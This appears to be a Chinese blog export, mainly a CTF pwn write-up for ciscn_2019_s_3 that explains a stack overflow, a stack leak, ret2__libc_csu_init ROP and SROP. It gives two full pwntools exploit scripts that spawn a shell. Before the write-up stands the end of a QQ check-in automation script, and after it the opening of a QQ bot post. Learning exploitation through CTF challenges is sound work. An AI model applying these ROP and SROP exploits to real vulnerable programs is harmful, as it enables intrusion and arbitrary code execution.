<span class="keyword">print</span> <span class="string">'[-] 失败太多次了! 终止..'</span></span><br><span class="line">                self.skey = <span class="string">'5555555555'</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Getgtk</span><span class="params">(self)</span>:</span></span><br><span class="line">        hashes = <span class="number">5381</span></span><br><span class="line">        <span class="keyword">for</span> letter <span class="keyword">in</span> self.skey:</span><br><span class="line">            hashes += (hashes &lt;&lt; <span class="number">5</span>) + ord(letter)</span><br><span class="line">        <span class="keyword">return</span> hashes &amp; <span class="number">0x7fffffff</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.Getskey()</span><br><span class="line">        url = <span class="string">'https://qun.qq.com/cgi-bin/qiandao/sign/publish'</span></span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">'Host'</span>:<span class="string">'qun.qq.com'</span>,</span><br><span class="line">            <span class="string">'Origin'</span>:<span class="string">'https://qun.qq.com'</span>,</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Linux; Android 9; Redmi Note 7 Pro Build/PKQ1.181203.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/77.0.3865.120 MQQBrowser/6.2 TBS/045224 Mobile Safari/537.36 V1_AND_SQ_8.3.9_1424_YYB_D QQ/8.3.9.4635 NetType/4G WebP/0.3.0 Pixel/1080 StatusBarHeight/80 SimpleUISwitch/0 QQTheme/2081'</span>,</span><br><span class="line">            <span class="string">'Cookie'</span>: <span class="string">'uin='</span> + self.uin + <span class="string">';skey='</span> + self.skey</span><br><span class="line">        &#125;</span><br><span class="line">        bkn = self.Getgtk()</span><br><span class="line">        <span class="keyword">for</span> gc <span class="keyword">in</span> self.QqunList:</span><br><span class="line">            data = &#123;</span><br><span class="line">                    <span class="string">'bkn'</span>: bkn,<span class="comment">#这是根据skey按照一个算法生成的,等下会介绍</span></span><br><span class="line">                    <span class="string">"category_id"</span>: <span class="number">9</span>,<span class="comment">#类别ID,这是Q群签到的一个选项来着...抓包拿到的是9,可以自行更改</span></span><br><span class="line">                    <span class="string">"page"</span>: <span class="number">0</span>,<span class="comment">#好像和其他几个有关联?</span></span><br><span class="line">                    <span class="string">"pic_id"</span>: <span class="number">124</span>,<span class="comment">#签到图片ID</span></span><br><span class="line">                    <span class="string">'gc'</span>: gc,<span class="comment">#QQ群号</span></span><br><span class="line">                    <span class="string">'client'</span>: <span class="string">'2'</span>,<span class="comment">#我也不知道,反正我抓包拿到的是2...应该能自行更改</span></span><br><span class="line">                    <span class="string">'lgt'</span>: <span class="string">'0'</span>,<span class="comment">#经度</span></span><br><span class="line">                    <span class="string">'lat'</span>: <span class="string">'0'</span>,<span class="comment">#纬度</span></span><br><span class="line">                    <span class="string">'poi'</span>: <span class="string">'签到地点'</span>,<span class="comment">#可以自行更改</span></span><br><span class="line">                    <span class="string">'text'</span>: <span class="string">'你想说的话'</span><span class="comment">#可以自行更改</span></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> requests.post(url=url, data=data, headers=headers).content \</span><br><span class="line">                    == <span class="string">'&#123;"cgicode":0,"retcode":0,"msg":"","data":&#123;&#125;&#125;'</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[+] '</span> + time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime()) \</span><br><span class="line">                      + <span class="string">'QQ:'</span> + self.uin[<span class="number">1</span>:] + <span class="string">' 群号:'</span> + gc + <span class="string">'签到成功!'</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'[-] '</span> + time.strftime(<span class="string">"%Y-%m-%d %H:%M:%S"</span>, time.localtime()) \</span><br><span class="line">                      + <span class="string">'QQ:'</span> + self.uin[<span class="number">1</span>:] + <span class="string">' 群号:'</span> + gc + <span class="string">'签到失败!'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">for</span> userInfo <span class="keyword">in</span> usersInfo:</span><br><span class="line">        test = Sign(userInfo[<span class="number">0</span>],userInfo[<span class="number">1</span>],userInfo[<span class="number">2</span>],userInfo[<span class="number">3</span>])</span><br><span class="line">        test.sign()</span><br></pre></td></tr></table></figure><h1 id="0x04-挂载到服务器"><a href="#0x04-挂载到服务器" class="headerlink" title="0x04 挂载到服务器"></a>0x04 挂载到服务器</h1><p>要现在服务器安装好脚本所需的必要环境：python2.7、requests库、selenium库及其对应的google-chrome和chromedriver，具体不再多说。</p><p>设置定时任务:</p><p>这里采用linux的 crontab 。</p><p>阿里云的服务器自带…其他的服务器自带与否我也不清楚</p><p>执行<code>sudo vim /etc/crontab</code>来编辑设置定时任务</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200703234530.png" alt></p><p>最后一行才是我自己设置的，其余全是服务器本身设置的。</p><p>最后一行表示每天早上6点以root权限执行该脚本，并将输出信息追加保存到我的log文件中，log文件自己创就行…保不保存其实都可以，看自己选择了。</p><p>这些路径根据自己的实际路径修改就行。</p><h1 id="0x05-写在最后"><a href="#0x05-写在最后" class="headerlink" title="0x05 写在最后"></a>0x05 写在最后</h1><p>懒惰是人类发展的第一生产力，如果我不是个懒狗，我也不会想着去写这个脚本。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/49b39a16f132ed84.jpg" alt></p>]]></content>
      <categories>
        <category>开发</category>
      </categories>
  </entry>
  <entry>
    <title>Ciscn_2019_s_3</title>
    <url>/2020/03/07/Ciscn-2019-s-3/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/73810901_p0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00  前言"></a>0x00 前言</h1><p>这道题目对我来说还是有些难度的。</p><p>通过这道题目，我学到了两种漏洞利用手段:<code>ret2__libc_csu_init</code>、<code>SROP</code>。</p><p>题目在BUUCTF可以下到。</p><h1 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure><p>关键函数是<code>vuln</code>和<code>gadgets</code>函数。</p><p>先来看<code>vuln函数</code>，IDA的伪代码界面只能看出来这是个syscall，看不到函数的具体参数，所以来看汇编。</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200307213301.png" alt></p><p>转换一下就是read(0,&amp;rsp-0x10,0x400) 、 write(1,&amp;rsp-0x10,0x30)</p><p>这里可以通过溢出来劫持RIP。</p><p>再来看<code>gadgets函数</code></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200307213448.png" alt></p><p>这里需要注意两个地方</p><p><code>mov rax,15</code>和<code>mov rax,59</code></p><p>这里涉及到Linux系统调用</p><p>15对应的是sys_rt_sigreturn系统调用</p><p>59对应的是sys_execve系统调用</p><p>所以这道题目可以有两种办法来做。</p><ul><li><p>第一种办法是依靠59对应的execve，然后想办法执行execve(“/bin/sh”,0,0)</p></li><li><p>第二种办法是依靠15对应的sys_rt_sigreturn，借助sigreturn frame来执行execve(“/bin/sh”,0,0)</p></li></ul><h1 id="0x02-方法一-ret2-libc-csu-init"><a href="#0x02-方法一-ret2-libc-csu-init" class="headerlink" title="0x02 方法一  ret2__libc_csu_init"></a>0x02 方法一 ret2__libc_csu_init</h1><p><strong>借助59对应的sys_execve</strong></p><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>由于程序没有给我们<code>/bin/sh</code>，我们需要通过read函数手动输入，但是我们需要知道我们的输入存在什么地方了？可以知道输入是存在栈上了，所以可以先泄露栈地址。</p><p>当我们拿到栈地址并且知道<code>/bin/sh\x00</code>的地址，就可以通过rop执行execve(“/bin/sh”,0,0)，其中传参所用寄存器依次是rdi、rsi、rdx，分别对应/bin/sh、0 、 0 ，而要执行系统调用 还需要rax = 59。syscall可以在IDA中找到。</p><h2 id="Try-it-！"><a href="#Try-it-！" class="headerlink" title="Try it ！"></a>Try it ！</h2><h3 id="Leak-stack-addr"><a href="#Leak-stack-addr" class="headerlink" title="Leak stack addr"></a>Leak stack addr</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">main = <span class="number">0x4004ED</span></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + <span class="string">'b'</span>*<span class="number">8</span> + p64(main)</span><br><span class="line">c.send(payload)</span><br></pre></td></tr></table></figure><p><strong>关于这个payload有一点需要说明</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/20200308022549.png" alt></p><p>由于程序中调用完syscall后就直接进行了retn，而且此时rsp == rbp，所以我们payload中p64(main)就对应的是返回地址。</p><p>通过调试</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7fffffffdda0</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x6262626262626262</span> &lt;- rsp<span class="number">-0x10</span>==/bin/sh\x00 + <span class="string">'b'</span>*<span class="number">8</span></span><br><span class="line"><span class="number">0x7fffffffddb0</span>:	<span class="number">0x00000000004004ED</span>	<span class="number">0x0000000000400536</span> </span><br><span class="line"><span class="number">0x7fffffffddc0</span>:	<span class="number">0x00007fffffffdeb8</span>	<span class="number">0x0000000100000000</span></span><br></pre></td></tr></table></figure><p>可以看到0x7fffffffddc0位置存着一处栈地址，并且这个地址离我们输入的/bin/sh\x00的距离为</p><p>0x00007fffffffdeb8 - 0x7fffffffdda0 = 0x118，这个偏移是固定的，那么我们可以通过write函数打印出这个地址，然后减去这个偏移，就能得到/bin/sh的地址。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">offset = <span class="number">0x118</span></span><br><span class="line">binsh = u64(c.recv()[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">0x118</span></span><br><span class="line">log.success(<span class="string">'binsh = '</span> + hex(binsh))</span><br></pre></td></tr></table></figure><h3 id="ret2-libc-csu-init"><a href="#ret2-libc-csu-init" class="headerlink" title="ret2__libc_csu_init"></a>ret2__libc_csu_init</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">execv = <span class="number">0x4004E2</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00000000004004E2 ; </span></span><br><span class="line"><span class="string">.text:00000000004004E2                 mov     rax, 59</span></span><br><span class="line"><span class="string">.text:00000000004004E9                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000400517                 syscall                 ;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p6r = <span class="number">0x40059A</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000400596 loc_400596:</span></span><br><span class="line"><span class="string">.text:0000000000400596                 add     rsp, 8</span></span><br><span class="line"><span class="string">.text:000000000040059A                 pop     rbx</span></span><br><span class="line"><span class="string">.text:000000000040059B                 pop     rbp</span></span><br><span class="line"><span class="string">.text:000000000040059C                 pop     r12</span></span><br><span class="line"><span class="string">.text:000000000040059E                 pop     r13</span></span><br><span class="line"><span class="string">.text:00000000004005A0                 pop     r14</span></span><br><span class="line"><span class="string">.text:00000000004005A2                 pop     r15</span></span><br><span class="line"><span class="string">.text:00000000004005A4                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">movcall = <span class="number">0x400580</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000400580 loc_400580:</span></span><br><span class="line"><span class="string">.text:0000000000400580                 mov     rdx, r13</span></span><br><span class="line"><span class="string">.text:0000000000400583                 mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400586                 mov     edi, r15d</span></span><br><span class="line"><span class="string">.text:0000000000400589                 call    qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:000000000040058D                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000400591                 cmp     rbx, rbp</span></span><br><span class="line"><span class="string">.text:0000000000400594                 jnz     short loc_400580</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004005a3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x00000000004005a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>除了pop_rdi_ret是用的<code>ROPgadget --binary ciscn_s_3 --only &#39;pop|ret&#39;</code>找到的</p><p>其他都可以在IDA里面找到</p><p>这道题目的核心也就在<code>__libc_csu_init</code>里面的<code>loc_400596</code>与<code>loc_400580</code>了</p><p>r13能传给rdx</p><p>r14传给rsi</p><p>r15d能传给edi</p><p>最后call [r12 + rbx*8]，然后比较rbx和rbp是否相等，如果不等，则循环执行loc_400580</p><p><strong>这个payload构造的非常巧妙，反正我自己是构造不出来</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + <span class="string">'b'</span>*<span class="number">8</span> + p64(p6r)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(binsh + <span class="number">0x50</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(movcall) + p64(execv)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh) + p64(syscall)</span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>注意第二行，有几点需要说明。</p><ul><li>首先是让rbx和rbp都为0(只要保证rbx+1不等于rbp就行)，这样是有目的的，是为了能够过会执行<code>0x40058D add rbx, 1</code>以后 rbx不等于rbp，然后执行<code>jnz short loc_400580</code>从而再次进入循环来执行<code>call qword ptr [r12+rbx*8]</code></li><li>其次是p64(binsh + 0x50)，这个是要传给rsi的，binsh + 0x50正好对应的就是p64(execv)，第一次执行<code>call qword ptr [r12+rbx*8]</code>时，由于<code>rbx = 0</code>，所以就相当于执行<code>call [r12]</code>即<code>call [rsi]</code>，也就是执行<code>execv = 0x4004E2对应的mov rax,59;ret</code>。<strong>注意这里的call指令，相当于jmp 到 r12 + rbx*8这个地址里存放的地址，以这里为例，这就相当于 jmp 0x4004E2</strong></li><li><strong>注意到前面是r15d传给edi，而不是rdi。r15d指的是r15的低32位，edi也是rdi的低32位，因此为了防止rdi里面曾存有其他数据占用了高32位，需要先通过p6r令rdi = 0 ，所以payload第二行后面的对应rdi位置的是p64(0)</strong></li></ul><h3 id="payload的执行流程"><a href="#payload的执行流程" class="headerlink" title="payload的执行流程"></a>payload的执行流程</h3><p><strong>实际上这个payload的执行流程由于涉及到<code>call qword ptr [r12+rbx*8]</code>而变得挺有趣而且巧妙的，可以调试跟一下，挺好玩的</strong></p><p>首先当我们向程序输入payload以后，程序会返回到p64(p6r)来执行一系列pop和ret，p64(p6r)的ret会返回到p64(movcall)从而进入一个我们故意设置的循环(利用的是故意让rbx不等于rbp从而执行<code>cmp rbx, rbp;jnz short loc_400580</code>)</p><p>此刻从整体来看, RSP是指向栈中<code>p64(execv)</code>对应的位置的。ps : 由于在执行<code>call qword ptr [r12+rbx*8]</code>的时候RSP也会变化并在call返回是还原RSP本来的值，但为了分析payload的执行流程，忽略call时RSP的变化从整体来看比较好 。</p><p>第一次执行完<code>call qword ptr [r12+rbx*8]</code>，由于经过了<code>add rbx,1</code>,所以此时rbx=1，rbp=0，它俩不相等，所以循环到loc_400580执行第二次循环。</p><p>而这次就会执行<code>call [rsi + 8]</code>，也就是执行<code>pop_rdi_ret</code>，由于此时RSP指向的是栈中p64(execv)的位置，那么当我们pop rdi的时候，会将RSP指向的值即p64(execv)传给rdi，同时<strong>RSP += 8</strong>，此刻RSP指向栈中p64(pop_rdi_ret)的位置，当执行ret的时候，RIP便指向了p64(pop_rdi_ret)，同时 <strong>RSP += 8</strong>，<strong>从而跳出了我们设置的循环</strong>，此刻RSP指向栈中p64(binsh)对应的位置。</p><p>逃离了<code>call qword ptr [r12+rbx*8]</code>这个循环怪圈以后，通过pop rdi，将binsh 传给了rdi，然后ret到syscall执行系统调用。</p><p><strong>payload很巧妙，能够利用循环并且跳出循环</strong></p><p>可惜我太菜了，自己构造不出来，自己构造出来的一个看似能打通的实际上打不通。。。</p><h2 id="完整EXP1-py"><a href="#完整EXP1-py" class="headerlink" title="完整EXP1.py"></a>完整EXP1.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',28019)</span></span><br><span class="line">main = <span class="number">0x4004ED</span></span><br><span class="line"></span><br><span class="line">execv = <span class="number">0x4004E2</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00000000004004E2 ; </span></span><br><span class="line"><span class="string">.text:00000000004004E2                 mov     rax, 59</span></span><br><span class="line"><span class="string">.text:00000000004004E9                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000400517                 syscall                 ;</span></span><br><span class="line"><span class="string">.text:0000000000400519                 retn                    ;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">p6r = <span class="number">0x40059A</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:000000000040059A                 pop     rbx</span></span><br><span class="line"><span class="string">.text:000000000040059B                 pop     rbp</span></span><br><span class="line"><span class="string">.text:000000000040059C                 pop     r12</span></span><br><span class="line"><span class="string">.text:000000000040059E                 pop     r13</span></span><br><span class="line"><span class="string">.text:00000000004005A0                 pop     r14</span></span><br><span class="line"><span class="string">.text:00000000004005A2                 pop     r15</span></span><br><span class="line"><span class="string">.text:00000000004005A4                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">movcall = <span class="number">0x400580</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000400580 loc_400580:</span></span><br><span class="line"><span class="string">.text:0000000000400580                 mov     rdx, r13</span></span><br><span class="line"><span class="string">.text:0000000000400583                 mov     rsi, r14</span></span><br><span class="line"><span class="string">.text:0000000000400586                 mov     edi, r15d</span></span><br><span class="line"><span class="string">.text:0000000000400589                 call    qword ptr [r12+rbx*8]</span></span><br><span class="line"><span class="string">.text:000000000040058D                 add     rbx, 1</span></span><br><span class="line"><span class="string">.text:0000000000400591                 cmp     rbx, rbp</span></span><br><span class="line"><span class="string">.text:0000000000400594                 jnz     short loc_400580</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004005a3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x00000000004005a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + <span class="string">'b'</span>*<span class="number">8</span> + p64(main)</span><br><span class="line">c.send(payload)</span><br><span class="line">offset = <span class="number">0x118</span></span><br><span class="line">binsh = u64(c.recv()[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">0x118</span></span><br><span class="line">log.success(<span class="string">'binsh = '</span> + hex(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + <span class="string">'b'</span>*<span class="number">8</span> + p64(p6r)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(binsh + <span class="number">0x50</span>) + p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(movcall) + p64(execv)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh) + p64(syscall)</span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x03-方法二-SROP"><a href="#0x03-方法二-SROP" class="headerlink" title="0x03 方法二 SROP"></a>0x03 方法二 SROP</h1><h2 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h2><p>与方法一相同，都要先泄露栈，目的是为了泄露我们输入的/bin/sh的存放地址。</p><p>然后伪造sigreturn frame 来执行execve(“/bin/sh”,0,0)</p><h2 id="Try-it！"><a href="#Try-it！" class="headerlink" title="Try it！"></a>Try it！</h2><h3 id="Leak-stack-addr-1"><a href="#Leak-stack-addr-1" class="headerlink" title="Leak stack addr"></a>Leak stack addr</h3><p>和方法一相同</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)<span class="comment">#Important!!!!!!!!!!</span></span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4004ED</span></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + <span class="string">'b'</span>*<span class="number">8</span> + p64(main)</span><br><span class="line">c.send(payload)</span><br><span class="line">offset = <span class="number">0x118</span></span><br><span class="line">binsh = u64(c.recv()[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">0x118</span></span><br><span class="line">log.success(<span class="string">'binsh = '</span> + hex(binsh))</span><br></pre></td></tr></table></figure><h3 id="伪造sigreturn-frame-来执行execve-“-bin-sh”-0-0"><a href="#伪造sigreturn-frame-来执行execve-“-bin-sh”-0-0" class="headerlink" title="伪造sigreturn frame 来执行execve(“/bin/sh”,0,0)"></a>伪造sigreturn frame 来执行execve(“/bin/sh”,0,0)</h3><p>pwntools里面有sigreturn frame 相关模块。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sigreturn = <span class="number">0x4004DA</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00000000004004DA                 mov     rax, 0Fh</span></span><br><span class="line"><span class="string">.text:00000000004004E1                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000400517                 syscall                 ;</span></span><br><span class="line"><span class="string">.text:0000000000400519                 retn                    ;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + <span class="string">'b'</span>*<span class="number">8</span> + p64(sigreturn) + p64(syscall) + str(frame)</span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><p>这个模块用起来相当方便啊，只需要指定各个寄存器的值就好了。</p><p>关于这个sigreturn，有点高深，具体可以去搜一下，不过应对CTF的SROP题目的话，会用这个SigreturnFrame模块应该就够了。</p><p><strong>有一点需要说明</strong></p><p><code>context(arch=&#39;amd64&#39;, os=&#39;linux&#39;)</code>，这个一定要指明，不然会报错。</p><h2 id="完整EXP2-py"><a href="#完整EXP2-py" class="headerlink" title="完整EXP2.py"></a>完整EXP2.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = process(<span class="string">'./ciscn_s_3'</span>)</span><br><span class="line"><span class="comment">#c = remote('node3.buuoj.cn',28019)</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)<span class="comment">#Important!!!!!!!!!!Important!!!!!!!!!!</span></span><br><span class="line">main = <span class="number">0x4004ED</span></span><br><span class="line"></span><br><span class="line">sigreturn = <span class="number">0x4004DA</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:00000000004004DA                 mov     rax, 0Fh</span></span><br><span class="line"><span class="string">.text:00000000004004E1                 retn</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x400517</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">.text:0000000000400517                 syscall                 ;</span></span><br><span class="line"><span class="string">.text:0000000000400519                 retn                    ;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + <span class="string">'b'</span>*<span class="number">8</span> + p64(main)</span><br><span class="line">c.send(payload)</span><br><span class="line">offset = <span class="number">0x118</span></span><br><span class="line">binsh = u64(c.recv()[<span class="number">32</span>:<span class="number">40</span>]) - <span class="number">0x118</span></span><br><span class="line">log.success(<span class="string">'binsh = '</span> + hex(binsh))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = constants.SYS_execve</span><br><span class="line">frame.rdi = binsh</span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/bin/sh\x00'</span> + <span class="string">'b'</span>*<span class="number">8</span> + p64(sigreturn) + p64(syscall) + str(frame)</span><br><span class="line"></span><br><span class="line">c.send(payload)</span><br><span class="line"></span><br><span class="line">c.interactive()</span><br></pre></td></tr></table></figure><h1 id="0x04-写在最后"><a href="#0x04-写在最后" class="headerlink" title="0x04 写在最后"></a>0x04 写在最后</h1><p>这道题真的用了挺长时间的，加上更博客也用了不少时间，不过又调试了一遍又有了新收获新理解。</p><p>参考链接:</p><p><a href="https://blog.csdn.net/github_36788573/article/details/103541178" target="_blank" rel="noopener">CSDN</a></p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/advanced-rop-zh/#srop" target="_blank" rel="noopener">CTF-WIKI</a></p><p>最后要感谢各位师傅们的博客以及BUUCTF</p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/55464236_p0.png" alt></p>]]></content>
      <categories>
        <category>Pwn</category>
      </categories>
  </entry>
  <entry>
    <title>打造属于自己的QQ群机器人(已失效)</title>
    <url>/2020/07/11/%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84QQ%E7%BE%A4%E6%9C%BA%E5%99%A8%E4%BA%BA(%E5%B7%B2%E5%A4%B1%E6%95%88)/</url>
    <content><![CDATA[<p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/9020d811b912c8fc93e8219deb039245d78821f0.jpg" alt></p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p><strong>8月4号最新更新:</strong></p><p>最近没鼓捣Q群机器人，也没在意它的运行情况，今天鼓捣了一下发现连不上酷Q接口…</p><p>百度了一下，原来是腾讯为了推广自己的机器人，封杀了其他第三方机器人。。。酷Q也不幸遇难。唉！</p><hr><p>最近对机器人产生了挺大的兴趣(主要因为两部galgame)，偶然间也在一个QQ群里看到一个较为智能的机器人，所以我也想拥有一个QQ机器人，也就有了这篇博文。</p><p><strong>#ATRI天下第一!</strong></p><p><strong>[宇宙没有永恒的事物，所以哀叹事物的终结也毫无意义，在迎来终结之前，怎样度过这段时间才是最重要的]</strong></p><p><img src="https://liul14nimg.oss-cn-qingdao.aliyuncs.com/liul14nimg/ev003el.png" alt></p><h1 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h1><p>一番Google以后得知，由于QQ的消息都是会经过加密的，所以除非搞清楚QQ的某些协议和加密算法，不然自己去实现获取QQ的消息是有很大难度的。</p><p>又得知目前的QQ机器人大部分都是用一款名为酷Q的软件来实现的，主要是因为它通过神奇的方式搞清楚了QQ的协议。</p><p>在网页QQ(webqq，于19年3月去世)还在世的时候，它采用的是webqq协议，据说比较容易获取和发送消息。</p><p>而现在QQ采用的是smartqq协议，具体是怎样的我也不清楚，或者说即便知道了也很难理解。</p><p><strong>既然存在有酷Q这个软件，那么就可以利用这个软件当做一个跳板来制作属于自己的机器人了。</strong></p><p>目前的酷Q有 <code>酷Q air</code>、<code>酷Q 